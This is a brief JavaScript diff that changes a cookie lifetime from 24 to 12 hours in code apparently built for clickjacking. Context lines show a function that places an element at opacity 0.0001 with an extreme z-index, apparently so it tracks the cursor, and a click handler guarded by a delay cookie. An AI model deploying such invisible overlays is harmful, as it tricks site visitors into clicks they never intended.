@@ -68,7 +68,7 @@ function h12_followDiv() {
     $("#" + h12_div).css("z-index", "9999999").css("position", "absolute").css("opacity", "0.0001");
 }
 function h12_setClick(){
-    h12_setCookie("_h12c_delay_time", '1', 24);
+    h12_setCookie("_h12c_delay_time", '1', 12);
     document.activeElement.blur();
 }
 function h12_startTracker() {
